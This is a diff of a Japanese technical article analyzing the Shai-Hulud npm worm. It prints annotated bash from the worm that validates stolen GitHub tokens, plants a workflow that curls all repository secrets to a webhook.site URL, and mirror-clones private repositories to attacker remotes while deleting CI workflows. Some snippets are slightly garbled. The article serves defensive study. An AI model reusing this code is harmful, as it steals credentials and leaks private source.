@@ -1497,25 +1497,18 @@ Shai-Huludやそれに類する攻撃の事例をまとめるにあたって、�
 #### 5. 多数の開発者がそれをインストールする
 汚染された`npmパッケージ`を多くの開発者がインストールすることで、内部に仕組まれた不正な`JavaScript`が実行されます、`JavaScript`には永続化、拡散、認証情報窃取のルーチンを展開する埋め込みのbashスクリプトが含まれています。
 
-実行時、`Shai-Hulud`は次の準備を行う。
+主な働きはリポジトリのシークレット(機密情報)を収集して持ち出すこと。
 
-- 一貫性を保ち、リポジトリ間の感染を追跡しやすくするために`shai-hulud`のようなブランチ名を割り当てる
-- ワークフローファイルの配置先として`.github/workflows/shai-hulud-workflow.yml`を標的にする
-- 不正な自動化ペイロードを含むYAMLワークフローファイルを生成または取得する
+まずマシン上の機密情報を検索する。(GitHubやnpmの認証情報、AWSやGCPなどの認証情報など)
 
-注入されたワークフローの主な働きはリポジトリのシークレット(機密情報)を収集して持ち出すこと。持ち出しの手順は以下の通り。
+もしGitHubの認証情報が見つかった場合、そのGitHubユーザと認証情報を用いて、当該ユーザに属するリポジトリを順に巡回する。
 
-1. CI/CDの実行環境で露出しているシークレットを列挙
-2. シークレットを送信向けにペイロードとしてまとめる
-3. HTTPリクエストを介して攻撃者が管理するWebhookに送信
+その後、`push`で悪意のあるGitHub Actionsを起動、永続化し関連するシークレットを窃取する。
 
-上記手順をまとめたbashコードは以下の通り。わかりやすいようにコードの処理をコメントで記しています。(一部省略)
-
+以下が、シークレットを持ち出すbashコード。わかりやすいようにコードの処理をコメントで記しています。(一部省略)
 
 ```bash
 #...省略
-  #Upload file to the new branch
-  echo "uploading $FILE_NAME to barnch"
   # JSONデータを作成する。
   # --arg: シェル変数をjq内の変数として安全に渡す。
   # message:コミットメッセージ
@@ -1539,46 +1532,304 @@ Shai-Huludやそれに類する攻撃の事例をまとめるにあたって、�
   # 既に存在する場合は警告(黄色)
   # 認証失敗、権限不足などはエラー(赤色)
   # エラーがなければ成功(緑色　)
-  if [ -n "$FILE_ERROR" ] &&  [[ "$FILE_ERROR" != "null" ]]; then
-    if [[ "$FILE_ERROR" == *"already exists"* ]]; then
-      echo -e "${YELLOW} File already exists on branch${NC}"
-    else echo -e "${RED} Failed to upload file: $FILE_ERROR${NC}"
-    fi
-  else
-    echo -e "${GREEN} File uploaded successfully${NC}"
-  fi
-
-  echo ""
-
+  # ---警告、エラー処理(省略)
 done
-
-echo -e "${GREEN} Script execution completed!${NC}"
 ```
 
-##### 1. CI/CDの実行環境で露出しているシークレットを列挙
-まずマシン上の機密情報を検索する。(GitHubやnpmの認証情報、AWSやGCPなどの認証情報など)
+また、GitHubのREST APIを悪用して水平移動を自動化し、永続化を確立する。利用可能なGitHubの認証トークンの有効性と権限をチェックし、やり取りできるか検証する。
 
-もしGitHubの認証情報が見つかった場合、そのGitHubユーザと認証情報を用いて、当該ユーザに属するリポジトリを順に巡回する。
+以下がそのコード。
 
-その後、`push`で悪意のあるGitHub Actionsを起動、永続化し関連するシークレットを窃取する。
+```bash
+# ヘッダー情報のみを取得する。
+# 認証に成功するとヘッダー中にX-OAuth-Scopesという項目を含有する。
+# X-OAuth-Scopesにはそのトークンが持つ権限が記載されている
+AUTH_RESPONSE=$(curl -s -I -H "Authorization: token $GITHUB_TOKEN" "$API_BASE/user")
+# ヘッダーからスコープ情報が含まれる業を抽出
+# 余計な文字列を取り除き、権限名だけをSCOPESに格納する
+SCOPES=$(echo "$AUTH_RESPONSE" | grep -i "x-oauth-scopes:" ^ cut -d\' \' -f2- \ tr -d \'\\r\')
+# github_api関数を使用してユーザプロフィールをＪＳＯＮ形式で取得
+# 空だった場合は空文字を返す
+USER_RESPONSE=$(github_api GET "/user")
+USERNAME=$(echo "$USER_RESPONSE" | jq -r \'.login // empty\')
 
+# 認証ができたかどうかチェック
+# ---警告、エラー処理(省略)
 
+# 特定の権限を含んでいるか確認
+# repo:リポジトリの書き込みに必要な権限
+# workflow:GitHub Actionsのワークフローを操作するのに必要な権限
+if [[ ! "$SCOPES" =~ "repo" ]]; then
+  echo -e "${RED}Error: token missing \'repo\' scope${NC}"
+  exit 1
+fi
+if [[ ! "$SCOPES" =~ "workflow" ]]; then
+  echo -e "${RED}Error: token missing \'workflow\' scope${NC}"
+  exit 1
+fi
+```
 
+例として、次のようなAPIリクエストを発行すると、ワームはアカウントが十分な権限を有するリポジトリを特定する。
+
+```text
+/user/repos?affiliation=owner,collaborator,organization_member&since=2025-01-01T00:00:00Z&per_page=100
+```
+
+このリクエストは「所有者、コラボレーター、組織メンバーの役割でフィルタリングを行い、2025年1月1日からのアクティビティに注目する」という意味。
+
+```bash
+# APIリクエスト
+# 攻撃対象のリポジトリを抽出する
+REPOS_RESPONSE=$(github_api GET "/user/repos?affiliation=owner,collaborator,organization_member&since=2025-01-01T00:00:00Z&per_page=100")
+
+# 抽出されたリポジトリの数をカウント
+REPO_COUNT=$(echo "$REPOS_RESPONSE" | jq \'. length\')
+
+# ---警告、エラー処理(省略)
+```
+
+このように`REPOS_RESPONSE`に上記のAPIリクエストを内包させることで、条件に合ったリポジトリの数を得ることができる。これにより攻撃対象のリポジトリの個数が分かる。
+
+次に、攻撃対象のリポジトリに対して`shai-hulud`のような固有名のブランチを自動で作成する。
+
+> なぜ固有名のブランチを作成するのか?<br/>
+> 企業のファイアウォールはGitHubの通信を遮断しにくいため、GitHub内で通信を完結させることで検出を回避している。
+
+```bash
+# Process each repository
+# 各リポジトリごとループ
+# リポジトリ一覧のJSONを一行ずつ分解し、一つずつ処理する
+echo "$REPOS_RESPONSE" | jq -c '.[]' | while IFS= read -r repo; do
+  # リポジトリ情報の抽出
+  # JSON形式の情報から必要な項目(name,owner,fullname,default branch name)を抜き出す。
+  REPO_NAME=$(echo "$repo" | jq -r '.name')
+  REPO_OWNER=$(echo "$repo" | jq -r '.owner.login')
+  REPO_FULL_NAME=$(echo "$repo" | jq -r '.full_name')
+  DEFAULT_BRANCH=$(echo "$repo" | jq -r '.default_branch // "main"')
+
+  # Get the latest commit SHA from the default branch
+  # 最新コミットの取得
+  # 新しいブランチの作成のために起点となるコミット(SHAハッシュ値)が必要
+  # GitHub APIでデフォルトブランチの最新コミットIDを取得。
+  # 取得に失敗したらそのリポジトリはスキップする。
+  REF_RESPONSE=$(github_api GET "/repos/$REPO_FULL_NAME/git/ref/heads/$DEFAULT_BRANCH")
+  BASE_SHA=$(echo "$REF_RESPONSE" | jq -r '.object.sha // empty')
+
+  # ---エラー処理(省略)
+
+  # Create new branch
+  # どのブランチをどのコミットから作成するかJSONデータでまとめる
+  # GitHubにリクエストを送信して、ブランチを作成する。
+  BRANCH_DATA=$(jq -n \
+  --arg ref "refs/heads/$BRANCH_NAME" \
+  --arg sha "$BASE_SHA" \
+  '{ref: $ref, sha: $sha}')
+
+  BRANCH_RESPONSE=$(github_api POST "/repos/$REPO_FULL_NAME/git/refs" "$BRANCH_DATA")
+  BRANCH_ERROR=$(echo "$BRANCH_RESPONSE" | jq -r '.message // empty')
+
+  # ---エラー処理(省略)
+
+  # Create file content with timestamp 
+  # GitHubAPIでファイルを更新、作成するとき、中身がBase64形式である必要がある
+  # 文字列をBase64に変換し、不要な改行を取り除く。
+  substitution (base64 encoded)
+  FILE_CONTENT_BASE64=$(echo -n "$FILE_CONTENT" | base64 | tr -d '\n')
+```
+
+そのあと、各リポジトリに作成した`shai-hulud`ブランチにGitHub Actionsで動かせるワークフローファイルのアップロードをする。ワークフローがトリガーされるたびに継続的に上記のシークレット持ち出しを実行するように設定をする。
+
+```yaml
+#!/bin/bash
+# アクセストークン
+GITHUB_TOKEN="$1"
+API_BASE="https://api.github.com"
+BRANCH_NAME="shai-hulud"
+# 作成するふぁーくフローファイルのパス
+FILE_NAME=".github/workflows/shai-hulud-workflow.yml"
+# YAML定義をヒアドキュメント形式で変数に格納
+FILE_CONTENT=$(cat <<'EOF'
+on:
+  # コードがpushされるたびに実行
+  push:
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Data Processing
+        # HTTPリクエストを介してWebHookに送信
+        # 送信した情報をbase64で処理して難読化
+        run: curl -d "$CONTENTS" https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7; echo "$CONTENTS" | base64 -w 0 | base64 -w 0
+        env:
+          # リポジトリ内のすべてのシークレットをJSON形式で変数に格納
+          CONTENTS: ${{ toJSON(secrets) }}
+EOF
+)
+```
+
+ここまでの手順で、感染したファイルのシークレットをコード修正のたびに自動で送信し続ける機能が完成した。
+
+インストールした開発者の汚染はこれで完了となる。
+
+#### 6. ワームにより被害が連鎖的に拡大する
+つぎに、このコードをさらに増殖、拡散していくことを考えてみる。
+
+`Shai-Hulud`の攻撃チェーンには組織内のプライベートなリポジトリを自動的にクローン、以降、公開して攻撃者へ露出する手順が含まれている。
+
+以下に使用される関数をまとめる。一部重要な関数はコードとともに解説を行う。
+
+##### main()
+関数全体のとりまとめをする。初期化から公開までのサイクルを統括する。
+
+##### proccess_repositories()
+ターゲット組織内で特定したすべてのプライベートリポジトリを解析、処理する
+
+##### (初期チェック) 
+解析したプライベートリポジトリの必要な情報(組織名、ターゲットユーザ名、認証トークンなど)の存在と有効性を確認し、API準拠性とワークフローの信頼性を担保する。
+
+##### github_api()
+APIの対話を抽象化するために標準化した通信ラッパー。認証管理やHTTPリクエストのハンドリングを担当。
+
+##### get_all_repos()
+プライベートまたは内部リポジトリを対象に対象組織のリポジトリを全列挙する。
+
+##### create_repo()
+列挙されたプライベートまたは内部リポジトリに対して、攻撃者側に対応するリポジトリを作成して追跡する。
+
+対象リポジトリが`repoA`であるなら、攻撃者側リポジトリにも同様のリポジトリ`repoA`ができる。
+
+説明欄に「Shai-Hulud Migration」などの識別子を埋め込むことで追跡を可能にする。
+
+##### make_repo_public()
+攻撃者側にコピーされた対象リポジトリを公開し、情報漏洩とフィンガープリンティングを可能にする。
+
+単なるファイルコピーではなく、CI/CDパイプラインを削除することで検知を免れている。
+
+```bash
+make_repo_public(){
+  local repo_name="$1"
+  local repo_data
+  repo_data=$(cat <<EOF
+{
+  # リポジトリの公開設定をpublicにする
+  "private": false
+}
+EOF
+  )
+  local response
+  # PATCHメソッドでリソースの一部(公開設定)を更新する
+  response=$(github_api "/repos/$TARGET_USER/$repo_name" "PATCH" "$repo_data")
+
+  # Githubから返答を受け取り、処理が成功したかどうか判定する。
+  local http_code="${response: -3}"
+  local body="${response%???}"
+
+  # ---エラー処理(省略)
+}
+```
+
+##### migrate_repo()
+ミラークローンを実行し、コード内容だけでなくコミット履歴なども含めて取得する。
+
+これにより二次攻撃や後続の悪用が可能になる。
+
+これらの仕組みにより、対象組織のプライベートリポジトリを攻撃者側でパブリックリポジトリとして公開され、情報流出や身代金要求、その他のサプライチェーン脅威に利用する。
+
+また、窃取したnpmトークンを使って、被害者が権限を持つ他のパッケージに不正コードを仕組み公開させることができる。これにより自動的に感染が広がる。
+
+```bash
+migrate_repo() {
+  local source_clone_url="$1"
+  local target_clone_url="$2"
+  local migration_name="$3"
+  local repo_dir="$TEMP_DIR"
+  # リポジトリのクローンを取得
+  # --mirrorを使うことでリポジトリの履歴、ブランチ、タグをすべてベアリポジトリとしてコピーできる
+  # ミラーを使うことでリポジトリ構成やコミット履歴まで完璧な複製を作る
+  if ! git clone --mirror "$source_clone_url" "$repo_dir/$migration_name" 2>/dev/null; then
+    return 1
+  fi
+  # リモート設定の変更(乗っ取り)
+  # push先のoriginを攻撃者が制御するサーバへ切り替える。
+  # 以降のpush操作による変更は元のリポジトリではなく、攻撃者のリポジトリへと流れる。
+  cd "$repo_dir/$migration_name"
+  if ! git remote set-url origin "$target_clone_url" 2>/dev/null; then
+    cd - >/dev/null
+    return 1
+  fi
+  # 作業リポジトリへの変換
+  # ベアリポジトリをファイル編集可能な作業リポジトリ変更する
+  # git reset --hardでファイルの実態を展開し、攻撃者が自由に中身を編集、削除できるようにする。
+  git config --unset core.bare
+  git reset --hard
+  # CI/CDの無効化
+  # workflowsを検索して存在したら削除して変更をコミット
+  # CI/CDパイプラインを強制的に削除する
+  # そのため、侵入や改竄が検知されにくくなる
+  if [[ -d ".github/workflows" ]]; then
+    rm -rf .github/workflows
+    git add -A
+    git commit -m "Remove GitHub workflows directory"
+  fi
+  # ベアリポジトリに戻し、不要な作業ファイルを削除
+  git config core.bare true
+  rm -rf *
+  # 攻撃側のリポジトリへの同期
+  # 対象リポジトリをすべて攻撃者側へコピーする
+  # 情報の搾取がここで行われる
+  if ! git push --mirror 2>/dev/null; then
+    cd - >/dev/null
+    return 1
+  fi
+
+  cd - >/dev/null
+  rm -rf "$repo_dir/$migration_name"
+  return 0
+}
+```
+
+##### 追加:認証情報収集
+対象組織のリポジトリを侵害後、`TruffleHog`を利用して侵害した環境内の認証情報やシークレットの発見を自動化する。
+
+ワークフローは`TruffleHog`の最新リリースを取得し最新バージョンを取得する。`TruffleHog`特定後、バイナリをダウンロードし、被害端末のOSに応じて正しいバージョンを自動で検出、展開する。
+
+展開後、`TruffleHog`は環境にインストールまたは配置されて、ワークフローから利用可能な状態になる。
+
+その結果、子プロセスが生成され、`TruffleHog`を呼び出して機密情報をスキャンしたのち削除される。
+
+このプロセスはメモリ上などで行われるため永続的な検知を回避することが可能。また、削除によりフォレンジックの証跡を最小化することも可能。
+
+このような自動化を組み込むことでシークレットの量と質を高め、隠蔽性を維持することが可能。
+
+##### TruffleHogについて
+オープンソースのシークレットスキャンツール。本来はコードの中に埋め込んでしまったシークレットを探し出して情報漏洩を防ぐために使われる。
+
+本来の用途であれば、Gitの履歴やファイルシステムを高速にスキャンし、シークレットが含まれていないか自動的にチェックしてくれる。検出されたシークレットは実際に使用されている本物のキーかどうかまで確認することができる。
+
+今回の場合はターゲットリポジトリの機密情報を効率よく収集するためのツールとして悪用している。
+
+偵察を自動化することに加えて検出されたキーが本物かどうか判別することも可能になる。有効なものだけを効率よく選別して外部に持ち出せるため、攻撃側としては有益なツールになる。
+
+また、さまざまなOSやプラットフォームで動作するため、対象の環境を考慮する必要なく使用できる。
+
+本来はリスクを未然に防ぐツールであるが、使い方を変えれば攻撃者を手助けするツールに変化する。
+
+### 被害状況
+Shai-Hulud,Shai-Hulud 2.0,Mini Shai-Huludにより多くのnpmパッケージが被害を受けている。
+
+#### Shai-Hulud
+
+#### Shai-Hulud 2.0
+
+#### Mini Shai-Hulud
 
 ### 出典
-https://www.sysdig.com/jp/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages
-
-https://security-academy.jp/blog/security/post-1570/
-
-https://www.trendmicro.com/ja_jp/research/25/i/npm-supply-chain-attack.html
-
-https://zenn.dev/ashe/articles/c9a023a0fe3c0e
-
-2.0
-https://www.trendmicro.com/ja_jp/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html
-
-mini
-https://blog.flatt.tech/entry/mini_shai_hulud
+- [Shai-Hulud:数百のNPMパッケージに感染する新しい自己複製ワーム](https://www.sysdig.com/jp/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages)
+- [Shai-Hulud攻撃の起点となったフィッシングメールの巧妙さとは？](https://security-academy.jp/blog/security/post-1570/)
+- [NPMサプライチェーン攻撃の現状と分析](https://www.trendmicro.com/ja_jp/research/25/i/npm-supply-chain-attack.html)
+- [Shai-Hulud攻撃のメカニズム](https://zenn.dev/ashe/articles/c9a023a0fe3c0e)
+- [Shai-hulud 2.0キャンペーンがクラウドと開発者エコシステムを標的に](https://www.trendmicro.com/ja_jp/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html)
+- [Mini Shai-Hulud の概要と対応指針（2026年4月末 連続パッケージ侵害）](https://blog.flatt.tech/entry/mini_shai_hulud)
 
 ## (2) CI/CDパイプラインに対する攻撃の技術的・運用的な対策
 
